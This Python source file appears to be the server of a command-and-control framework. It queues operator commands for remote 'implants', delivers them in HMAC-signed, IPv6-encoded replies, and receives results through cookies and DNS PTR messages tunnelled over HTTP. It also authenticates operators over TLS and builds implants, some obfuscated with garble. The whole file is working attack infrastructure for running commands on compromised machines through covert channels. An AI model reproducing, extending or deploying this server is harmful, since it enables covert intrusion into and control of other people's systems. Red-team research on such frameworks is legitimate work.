import base64
import importlib
import uuid
from dnslib import QTYPE, DNSRecord, RR, PTR
from urllib.parse import urlparse
import hashlib
import hmac
import json
import logging
import urllib
import zlib
import random
import socket
import ssl
import subprocess
import threading
import time
from queue import Queue, Empty
from threading import Thread
import secrets

from flask import Flask, request, jsonify, abort, Response, Blueprint

import ipv6_encoder
import pw_hash

app = Flask(__name__)
implant_checkout = {}

operator_session_tokens = set()

# Command queues for each implant identified by a 4-digit ID
implant_command_queues = {
    "1234": Queue(),
    "5678": Queue(),
}

# Result storage for each user
# Keeping this as a nested dict for now
"""
This is a nested dict for now
The intention is that a user will interact with multiple implants
Then to get the results from individual implants, they search for the implant key
The value they get is the first element which can then be popped to move others up
"""
result_storage = {}

# Logger configuration
logger = logging.getLogger(__name__)
logging.basicConfig(
    filename='server.log',
    level=logging.DEBUG,
    format='%(asctime)s.%(msecs)03d %(levelname)s %(module)s - %(funcName)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
)

# Logger configuration
auth_log = logging.getLogger(__name__)
logging.basicConfig(
    filename='auth.log',
    level=logging.DEBUG,
    format='%(asctime)s.%(msecs)03d %(levelname)s %(module)s - %(funcName)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
)

# Logger configuration
listener_log = logging.getLogger(__name__)
logging.basicConfig(
    filename='listener.log',
    level=logging.DEBUG,
    format='%(asctime)s.%(msecs)03d %(levelname)s %(module)s - %(funcName)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
)

# Load the default config file
with open('s_conf.json', 'r') as file:
    config = json.load(file)

# Then form a dict with the listener name and their enabled state
route_status = {}

def update_route_status (config_to_use, write_route_status, route_name):
    """
    Update the route_status dict with the routes from the config file
    :param config_to_use: The json config file
    :param write_route_status: The dict to write the route_status to
    :param route_name: The name of the route
    :return: nothing
    """
    logger.info("writing the route config to the route_status dict")
    route_configs = config_to_use.get(route_name, [])  # Assume this returns a list
    if not route_configs:
        return  # No config for this method key, so we skip

    for route_config in route_configs:
        name = route_config['name']
        path = route_config['path']
        method = route_config['method']

        if path not in write_route_status:
            route_status[path] = {}
        if name not in write_route_status[path]:
            route_status[path][name] = {}

        write_route_status[path][name][method] = {
            'enabled': route_config['enabled'].lower() == "true",
            'auth': route_config['auth'].lower() == "true",
            'comp': route_config['comp'].lower() == "true"
        }


def get_routes():
    """
    Load the route config from the json conf file
    :return: nothing
    """
    logger.info("loading route config for enabled/disabled routes")
    update_route_status(config, route_status, "default-GET")
    update_route_status(config, route_status, "default-POST")
    for listener in config["custom_listener"]:
        for route_name, routes in listener.items():
            for route in routes:
                update_route_status(route, route_status, route_name)

    print("Loading routes as follows:")
    print(route_status)


def register_blueprints(new_bp):
    """
    Dynamically registers any new Blueprints passed to the function by name.
    :param new_bp: The Blueprint name set in the decorator
    :return: nothing
    """
    module = importlib.import_module(f'blueprints.{new_bp}')
    blueprint = getattr(module, f'{new_bp}_blueprint')
    # Register the Blueprint and mark it as registered
    # Pass the blueprint decorator name and path from the config file
    app.register_blueprint(blueprint)
    # Refresh the route list for enabled/disabled states
    get_routes()
    logger.info(f"new blueprint registered: {new_bp}")


def verify_auth_token(uri, received_token, received_timestamp):
    """
    Verifies HMAC auth tokens sent by clients to confirm authorization
    :param uri: The URI that the request came to
    :param received_token: The HMAC token sent with the request
    :param received_timestamp: The timestamp that the token was sent
    :return: bool depending on comparison outcome
    """
    # Get the value from the implant config json file
    secret_key = config["keys"][0]["psk2"]
    time_window = 60  # Allow a 60-second window for token validity
    # Ensure the timestamp is within the allowed time window
    current_time = int(time.time())
    if abs(current_time - int(received_timestamp)) > time_window:
        auth_log.error("token past time window")
        return False

    # Recalculate the HMAC based on the URI and timestamp
    message = f"{uri}:{received_timestamp}"
    hmac_obj = hmac.new(secret_key.encode(), message.encode(), hashlib.sha256)
    computed_token = hmac_obj.hexdigest()

    # Verify the token
    return hmac.compare_digest(computed_token, received_token)


def build_implant(protocol):
    """
    Builds an implant for the selected protocol
    :param protocol: The protocol to communicate over
    :return: bool depending on build success
    """
    logger.info("building implant")
    rand_rng = secrets.SystemRandom()
    imp_id = rand_rng.randrange(1000,9999)
    match protocol:
        case "http":
            try:
                result = subprocess.check_output(
                    f"make http RAND_NUM={imp_id}",
                    cwd='../Implant',
                    stderr=subprocess.STDOUT
                )
                logger.info(f"successfully built implant for HTTP - ID {imp_id}")
                print(result)
                return True, f"Implant ID: {imp_id}"
            except subprocess.CalledProcessError as e:
                logger.error(f"error building: {e}")
                logger.error(f"stderr: {e.stderr}")
                return False
            except Exception as e:
                logger.error(f"general exception occurred: {e}")
                return False
        case "dns":
            try:
                result = subprocess.Popen(
                    f"make dns RAND_NUM={imp_id}",
                    cwd='../Implant',
                    stderr=subprocess.STDOUT
                )
                logger.info(f"successfully built implant for DNS - ID {imp_id}")
                print(result)
                return True, f"Implant ID: {imp_id}"
            except subprocess.CalledProcessError as e:
                logger.error(f"error building: {e}")
                logger.error(f"stderr: {e.stderr}")
                return False
            except Exception as e:
                logger.error(f"general exception occurred: {e}")
                return False
        case _:
            logger.error("no case match found")


def garble_implant(protocol):
    """
    Builds an implant using garble
    :param protocol: The protocol to communicate over
    :return: bool depending on build success
    """
    logger.info("building implant using garble")
    rand_num = random.randint(1000, 9999)
    match protocol:
        case "http":
            try:
                result = subprocess.run(
                    ["garble", "build", "-ldflags", f"-X main.CompUUID={rand_num}", "-tags", "http", "./http"],
                    cwd='../Implant',
                    check=True,
                    capture_output=True,
                    text=True
                )
                logger.info("success building")
                print(result)
                return True
            except subprocess.CalledProcessError as e:
                logger.error(f"error building: {e}")
                logger.error(f"stdout: {e.stdout}")
                logger.error(f"stderr: {e.stderr}")
                return False
            except Exception as e:
                logger.error(f"general exception occurred: {e}")
                return False
        case _:
            logger.error("no case match found")


def add_user(new_user_id):
    """
    Adds a new user to the result storage dict
    :param new_user_id: The users ID to add
    :return: Nothing
    """
    logger.info(f"adding new user {new_user_id}")
    result_storage.setdefault(new_user_id, [])


def add_command(implant_id, operator, command):
    """
    Add a command to the implants queue
    :param implant_id: The implant ID to send the command to
    :param operator: The operator who set the command
    :param command: The command itself to be run
    :return: Nothing
    """
    queue = implant_command_queues.get(implant_id)
    if queue:
        queue.put((operator, command))
        logger.info(f"Added command for implant {implant_id}: {command}")
    else:
        logger.error(f"No queue found for implant {implant_id}, creating one")
        implant_command_queues.setdefault(implant_id, Queue())
        queue = implant_command_queues.get(implant_id)
        queue.put((operator, command))
        logger.info(f"Added command for implant {implant_id}: {command}")


def get_results(user_id):
    """
    Get the users result storage
    :param user_id: The user ID to get the storage for
    :return: The results if any
    """
    fetched = str(result_storage.get(user_id, []))
    logger.info(f"got results {fetched}")
    result_storage.pop(user_id, 0)
    return fetched


def get_results_by_implant(user_id, implant_id):
    """
    Get and remove the oldest entry for a specific implant_id under a specific user.
    If there are no items remaining, remove the key for that user.

    :param user_id: The user ID to search within.
    :param implant_id: The implant ID to fetch and remove the entry for.
    :return: The entry value if found and removed, or None.
    """
    user_results = result_storage.get(user_id, [])

    for dict_store in user_results:
        if implant_id in dict_store:
            logger.info("Found the matching implant_id, retrieving and removing result")
            lump_result = dict_store.pop(implant_id, (None, None))  # Return a tuple if not found
            result, set_command = lump_result

            if not dict_store:
                user_results.remove(dict_store)

                # If the user's result list is now empty, remove the user_id from result_storage
                if not user_results:
                    result_storage.pop(user_id, None)

            return f"Command > '{set_command}' Result > '{result}'"

    return False


def get_waiting_command(implant_id):
    """
    Gets the oldest command waiting in the implants queue
    :param implant_id: The implant ID to get the queue for
    :return: Either the operator name who set it and the command or False/False
    """
    queue = implant_command_queues.get(implant_id)
    if queue:
        try:
            operator, command = queue.get()
            logger.info(f"Fetched command for implant {implant_id}: Operator={operator}, Command={command}")
            return operator, command
        except Empty:
            logger.info("empty queue found")
            return False, ""
    else:
        logger.info(f"No queue found for {implant_id}")
        return False, ""


def get_unique_results_for_user(user_id):
    """
    Get all unique client IDs for a specific user from result_storage.
    :param user_id: The user ID to fetch client IDs for.
    :return: A set of unique implant IDs with pending results for the user.
    """
    user_results = result_storage.get(user_id, [])
    # Create a set of keys (implant IDs) for all entries in the user's result list
    unique_client_ids = {key for entry in user_results for key in entry}
    return unique_client_ids  # Will return an empty set if no entries are found


def handle_update(uname, implant_id, result, set_command):
    """
    Handle implants sending results of commands to the server
    :param uname: The user who should get the results
    :param implant_id: The implant ID associated with the command
    :param result: The result sent by the implant
    :param set_command: The command set to be run
    :return: Boolean: True if success, otherwise returns error
    """
    logger.info("implant returned data, sending to operator storage")
    try:
        dict_store = {implant_id: (result, set_command)}
        result_storage.setdefault(uname, []).append(dict_store)
        logger.info(f"new result saved for user: {uname}")
        return True
    except Exception as e:
        logger.error(f"error occurred saving result for implant: {e}")
        return e


def checkout_command(imp_id, user_id, set_command):
    """
    Creates a queue that has the implant ID as the key and adds the user to it
    Informs the server who needs the latest result
    :param imp_id: The ID for the implant
    :param user_id: The ID for the user who sent the command
    :param set_command: The command set for the implant
    :return:
    """
    logger.info(f"checking out a command for {imp_id} by {user_id}")
    implant_checkout.setdefault(imp_id, Queue())
    implant_checkout[imp_id].put((user_id, set_command))


def handle_client(client_socket, client_id):
    """
    Handles the client sending and retrieving info
    :param client_socket: The socket object the client uses to connect
    :param client_id: The ID associated with a specific client
    :return: Uses the client socket to send data, function returns nothing
    """
    try:
        # Receive the client's initial message
        client_request = client_socket.recv(1024).decode()

        # Check what type of message it is first before processing further
        request_type, uname, *remainder = client_request.split(" ", 2)

        match request_type:
            case "AUTH":
                auth_log.info("authenticating user")
                request_type, uname, token = client_request.split(" ", 2)
                auth_log.info(f"checking authentication details for {uname}")
                if pw_hash.compare_hash(uname, token):
                    auth_log.info("user authenticated, generating session token")
                    returned_token = secrets.token_hex()
                    client_socket.send(returned_token.encode())
                    operator_session_tokens.add(returned_token)
                else:
                    client_socket.send("Bad username or password :red".encode())
                    logger.error(f"auth with bad username/password: user -> {uname}")

            case "PUB":
                logger.info("request to send command, attempting")
                request_type,  uname, token, implant_id, *command = client_request.split(" ", 4)
                logger.info(f"checking session token")
                if token in operator_session_tokens:
                    command = command[0] if command else ""
                    add_command(implant_id, uname, command)
                    client_socket.send("Command queued :blue".encode())
                    logger.info(f"Command: {command} added to queue for implant: {implant_id}")
                else:
                    client_socket.send(f"Bad token :red".encode())
                    logger.error("bad token")

            case "RTR":
                logger.info("controller requesting implant last messages")
                request_type, uname, token, implant_id, *message = client_request.split(" ", 4)
                logger.info(f"checking session token")
                if token in operator_session_tokens:
                    results = get_results_by_implant(uname, implant_id)
                    if results:
                        results = results + ":green"
                        client_socket.send(results.encode())
                        logger.info(f"sent controller results {results}")
                    else:
                        client_socket.send("No pending data".encode())
                        logger.info(f"sent controller results {results}")
                else:
                    client_socket.send(f"Bad token :red".encode())
                    logger.error("bad token")

            case "BLD":
                logger.info("controller building new implant")
                request_type, uname, token, proto, *message = client_request.split(" ", 4)
                logger.info(f"checking session token")
                if token in operator_session_tokens:
                    bld_status, bld_msg = build_implant(proto)
                    if bld_status is True:
                        client_socket.send(f"Building implant succeeded! {bld_msg}".encode())
                    else:
                        client_socket.send("Building implant failed... :red".encode())
                        logger.error(f"unknown error occurred when trying to build:\n"
                        f"Command was {request_type} {uname} {proto}")
                else:
                    client_socket.send(f"Bad token :red".encode())
                    logger.error("bad token")

            case "RFR":
                logger.info("refreshing routes")
                request_type, uname, token, bp_name, *message = client_request.split(" ", 4)
                if token in operator_session_tokens:
                    if bp_name == "":
                        get_routes()
                        logger.info("refreshed routes")
                        client_socket.send(f"Routes refreshed :blue".encode())
                    else:
                        # Refresh the route status
                        get_routes()
                        # Register the user Blueprints
                        register_blueprints(bp_name)
                        logger.info("refreshed routes/blueprints")
                        client_socket.send(f"Routes refreshed and Blueprints loaded :blue".encode())
                else:
                    client_socket.send(f"Bad token :red".encode())
                    logger.error("bad token, couldn't refresh routes")

            case "EMT":
                logger.info("empty request, client app refreshing")
                request_type, uname, token, *message = client_request.split(" ", 3)
                if token in operator_session_tokens:
                    to_send = "Token authenticated :blue"
                    pending_res = get_unique_results_for_user(uname)
                    if pending_res and request_type != "RTR":
                        to_send = f"Results from implant(s) {pending_res} pending for you :green"
                    client_socket.send(to_send.encode())
                else:
                    client_socket.send(f"Bad token :red".encode())
                    logger.error("bad token")

            case _:
                logger.error(f"unknown command: {request_type}")
                client_socket.send("Unknown command\n".encode())

    except Exception as e:
        logger.error(f"Error occurred when trying to receive connection: {e}")
        client_socket.send(f"Error: {e}\n".encode())
    finally:
        # Clean up and remove the client from active clients
        logger.info(f"Client {client_id} disconnected")
        client_socket.close()
        if client_id in active_clients:
            del active_clients[client_id]


def register_routes():
    """
    Initial default route names are retrieved from the s_conf.json file
    Default, the enabled state is True so these paths are active and used.
    If you don't want to use them, set it to false
    """

    @app.route("/", methods=['GET'])
    def def_endpoint1():
        """
        Verifies requests for commands with an HMAC and shared key
        :return: Either the waiting command or error
        """
        # The PSK used for the HMAC
        imp_psk1 = config["keys"][0]["psk1"]

        base_uri = request.path.split("/")
        root_path = "/" + base_uri[1]
        route_info = None
        # Loop through possible route names under the path
        for name, methods in route_status.get(root_path, {}).items():
            route_info = methods.get(request.method)
            if route_info:
                logger.info(f"route info found: {route_info} for {name}")
                break
        comp = route_info.get('comp', False)

        if comp:
            listener_log.info(f"listener using compression for {request.method}")

            listener_log.info(f"{request.method} incoming for listener URI")
            cookie_value = next(iter(request.cookies.values()))
            listener_log.info("got cookies")
            url_decoded_data = cookie_value.rstrip("=")  # Remove existing padding
            padding = len(url_decoded_data) % 4
            if padding:
                url_decoded_data += "=" * (4 - padding)  # Add necessary padding

            compressed_data = base64.b64decode(url_decoded_data)
            decompressed_data = zlib.decompress(compressed_data)
            unparsed_query = decompressed_data.decode('utf-8')
            parsed_data = urllib.parse.parse_qs(unparsed_query)
            get_imp_id = parsed_data.get('id')
            get_imp_id = get_imp_id[0]

        elif not comp:
            logger.info("uncompressed data")
            rcv_timestamp = request.cookies.get('timestamp')
            rcv_token = request.cookies.get('token')
            get_imp_id = request.cookies.get('id')
            listener_log.info("got the token and timestamp from cookies")
            listener_log.info(f"info: {rcv_token}, {rcv_timestamp}, {get_imp_id}")


        operator, command = get_waiting_command(get_imp_id)
        if operator is False:
            logger.error("operator and command in queue returned as false")
            abort(404)
        checkout_command(get_imp_id, operator, command)
        command = json.dumps(ipv6_encoder.string_to_ipv6(command))
        logger.info("sending command and HMAC to implant")
        hmac_k = hmac.new(imp_psk1.encode(), command.encode(), hashlib.sha256)
        hmac_sig = hmac_k.hexdigest()
        return jsonify(
            message=command,
            key=hmac_sig
        )

    @app.route("/", methods=['POST'])
    def def_endpoint2():
        imp_id = request.cookies.get('id')
        if request.content_type == "application/json":
            listener_log.info(f"{imp_id} sending us data")
            # Get the data
            result = request.get_json()
            # The result comes in as a JSON object under the field msg
            result = result.get("msg")
            # Check which operator is waiting for a result
            queue = implant_checkout[imp_id]
            listener_log.info("got queue for operator")
            operator, set_command = queue.get()
            listener_log.info(f"sending {operator} command")
            handle_update(operator, imp_id, result, set_command)
            return "200"
        elif request.content_type == "application/dns-message":
            listener_log.info("dns PTR request used for data sent to us")
            dns_query = request.data
            name_list = []
            # Parse the DNS query using dnslib
            dns_packet = DNSRecord.parse(dns_query)
            header = dns_packet.header
            transaction_id = header.id  # Transaction ID should always match the requests
            get_imp_id = request.cookies.get('id')
            # logger.info(f"{transaction_id} sending us data")

            # Create the response packet
            response_packet = DNSRecord(header)
            response_packet.header.id = transaction_id
            response_packet.header.qr = 1  # Query Response
            response_packet.header.aa = 1  # Authoritative Answer
            response_packet.header.ra = 1  # Recursion Available

            # Iterate over all questions in the DNS query
            for question in dns_packet.questions:
                qname = question.qname  # Query name
                name_list.append(qname)

            # Handle reverse DNS (PTR) query
            decoded_list = []
            for in_name in name_list:
                decoded_text = ipv6_encoder.decode_ipv6_to_text(in_name.label)
                decoded_list.append(decoded_text.strip('\x00'))

            # Get the data
            result = ' '.join(decoded_list)
            # Check which operator is waiting for a result
            queue = implant_checkout[str(get_imp_id)]
            logger.info("got queue for operator")
            operator, set_command = queue.get()
            logger.info(f"sending {operator} result")
            handle_update(operator, imp_id, result, set_command)

            # Send the implant a reply to the PTR request
            response_packet.add_answer(
                RR(rname=qname.label, rtype=QTYPE.PTR, rclass=1, ttl=300, rdata=PTR(b"example.com"))
            )

            # Sending the response back
            response_data = response_packet.pack()
            # Convert bytearray to bytes
            response_data = bytes(response_data)
            logger.info(f"sending response: {response_data} {type(response_data)}")
            return Response(response_data, content_type="application/dns-message")
        else:
            return 404


# Register routes initially
register_routes()


@app.before_request
def ignore_favicon():
    if request.path == '/favicon.ico':
        abort(204)  # No Content


@app.before_request
def restrict_routes():
    """Middleware to block disabled routes."""
    base_uri = request.path.split("/")
    root_path = "/" + base_uri[1]
    logger.info(f"checking if route is enabled: {root_path} {request.method}")

    route_info = None
    # Loop through possible route names under the path
    for name, methods in route_status.get(root_path, {}).items():
        route_info = methods.get(request.method)
        if route_info:
            logger.info(f"route info found: {route_info} for {name}")
            break

    if route_info:
        auth = route_info.get('auth', False)
        comp = route_info.get('comp', False)
        # Check if the route is disabled
        if not route_info.get('enabled', False):
            logger.warning(f"disabled route accessed: {request.path} {request.method}")
            abort(404)

        # Check if the route requires authentication
        if auth and not comp:
            logger.info(f"auth required for route: {request.path} {request.method}")
            logger.info("expecting uncompressed data")
            # Route requires an auth check
            # Determine if request is compressed or uncompressed
            # If compressed is set as enabled in listener,
            # Only expect one cookie regardless of name, just get the first one
            # If uncompressed, get the cookie values by literal ID
            rcv_timestamp = request.cookies.get('timestamp')
            rcv_token = request.cookies.get('token')
            get_imp_id = request.cookies.get('id')
            logger.info("got the token and timestamp from cookies")
            if verify_auth_token(get_imp_id, rcv_token, rcv_timestamp) is True:
                logger.info("route auth check success")
                pass
            else:
                abort(404)
        elif auth and comp:
            logger.info(f"auth required for route: {request.path} {request.method}")
            logger.info("expecting compressed data on a random cookie")
            # Get the first cookie
            cookie_value = next(iter(request.cookies.values()))
            logger.info("got cookies")
            url_decoded_data = cookie_value.rstrip("=")  # Remove existing padding
            padding = len(url_decoded_data) % 4
            if padding:
                url_decoded_data += "=" * (4 - padding)  # Add necessary padding

            compressed_data = base64.b64decode(url_decoded_data)
            decompressed_data = zlib.decompress(compressed_data)
            unparsed_query = decompressed_data.decode('utf-8')
            parsed_data = urllib.parse.parse_qs(unparsed_query)

            rcv_timestamp = parsed_data.get('timestamp')
            rcv_token = parsed_data.get('token')
            get_imp_id = parsed_data.get('id')
            logger.info("got the token and timestamp from cookies")
            logger.info(f"info: {rcv_token}, {rcv_timestamp}, {get_imp_id}")
            if verify_auth_token(get_imp_id[0], rcv_token[0], rcv_timestamp[0]) is True:
                logger.info("verified the auth token")
                pass
            else:
                abort(404)


def start_flask():
    app.run()


# Dictionary to store active clients {client_id: client_socket}
active_clients = {}

def start_server():
    """
    Start the socket server and the Flask server
    Run an infinite loop until cancelled to handle socket requests
    :return: Nothing
    """
    # Start the Flask server in a separate thread
    flask_thread = Thread(target=start_flask)
    flask_thread.start()
    get_routes()

    # Create and bind the socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))  # Bind to any available interface
    server.listen(5)

    # Configure SSL/TLS context
    server_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    server_context.minimum_version = ssl.TLSVersion.TLSv1_3
    server_context.maximum_version = ssl.TLSVersion.TLSv1_3
    server_context.load_cert_chain(certfile="server.pem")
    server_context.verify_mode = ssl.CERT_NONE
    secure_socket = server_context.wrap_socket(server, server_side=True)

    logger.info("TLS socket wrapped and starting on port 9999\n")

    while True:
        client_socket, addr = secure_socket.accept()
        client_id = str(uuid.uuid4())  # Assign a unique ID to the client
        logger.info(f"Accepted connection from: {addr}, assigned client ID: {client_id}")

        # Store client information in the active_clients dictionary
        active_clients[client_id] = {
            'socket': client_socket,
            'address': addr,
        }

        # Start a new thread to handle this client
        client_handler = threading.Thread(target=handle_client, args=(client_socket, client_id))
        client_handler.start()

        # Kill flask_thread and client_handler



if __name__ == "__main__":
    start_server()
